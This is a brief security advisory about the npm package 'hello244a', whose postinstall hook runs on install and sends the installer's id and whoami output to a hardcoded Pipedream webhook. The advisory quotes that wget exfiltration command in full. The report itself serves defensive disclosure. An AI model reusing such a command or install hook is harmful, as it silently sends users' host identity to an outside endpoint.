summary: hello244a postinstall exfiltrates host identity to attacker-controlled Pipedream endpoint
details: package.json declares a postinstall lifecycle script that automatically runs on `npm install` and executes `wget --quiet "https://eodxy50gl486xrx.m.pipedream.net/?id=$(id)&w=$(whoami)"`. The command shells out `id` and `whoami` on the installer's machine and transmits the resulting uid/gid/groups and username as query string parameters to a hardcoded Pipedream webhook (eodxy50gl486xrx.m.pipedream.net). The tarball ships no other source files, no `main` entry, and no declared functionality — the package's sole effect on install is the exfiltration hook. Installing this package causes automatic disclosure of the installer's host identity to an attacker-controlled endpoint and provides no legitimate value.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
